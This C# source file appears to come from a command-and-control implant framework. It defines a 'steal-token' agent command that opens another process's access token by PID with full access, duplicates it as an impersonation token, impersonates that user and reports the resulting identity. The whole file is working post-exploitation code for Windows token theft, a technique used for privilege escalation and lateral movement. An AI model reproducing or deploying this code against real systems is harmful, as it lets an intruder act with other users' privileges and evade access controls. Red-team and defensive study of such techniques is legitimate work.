using AgentClient.Domain.Models.Agents;
using AgentClient.Infrastructure.Native;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace AgentClient.Application.Commands
{
    public class StealToken : AgentCommand
    {
        public override string Name => "steal-token";

        public override string Execute(AgentTask task)
        {
            if (task.Arguments == null || task.Arguments.Length == 0)
            {
                return "Invalid Arg: PID number required";
            }

            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                return "Failed to convert PID";
            }

            Process process;
            try
            {
                // get process
                process = Process.GetProcessById(pid);
            }
            catch (ArgumentException)
            {
                return $"No process with PID: {pid}";
            }

            var hToken = IntPtr.Zero;
            var phNewToken = IntPtr.Zero;

            try
            {
                // open handle to token
                if (!Advapi32.OpenProcessToken(process.Handle, Advapi32.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                {
                    int error = Marshal.GetLastWin32Error();
                    return $"Failed to open process token. Error: {error}";
                }

                var secAttribute = new Advapi32.SECURITY_ATTRIBUTES();

                // duplicate token  
                if (!Advapi32.DuplicateTokenEx(
                    hToken, 
                    Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
                    ref secAttribute,
                    Advapi32.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    Advapi32.TOKEN_TYPE.TokenImpersonation,
                    out phNewToken))
                {
                    int error = Marshal.GetLastWin32Error();
                    
                    return $"Failed to duplicate token. Error: {error}";
                }
                
                // impersonate token
                if (!Advapi32.ImpersonateLoggedOnUser(phNewToken))
                {
                    int error = Marshal.GetLastWin32Error();
                    return $"Failed to impersonate token. Error: {error}";
                }

                // Try to perform action/tasks
                try
                {
                    using (var identity = new WindowsIdentity(phNewToken))
                    {
                        return $"Successful impersonation {identity.Name}";
                    }
                }
                finally
                {
                    Advapi32.RevertToSelf();
                }
            }
            finally
            {
                // close token handles
                if (hToken != IntPtr.Zero)
                    Kernel32.CloseHandle(hToken);
              
                if (phNewToken != IntPtr.Zero)
                    Kernel32.CloseHandle(phNewToken);

                process.Dispose();
            }
        }
    }
}
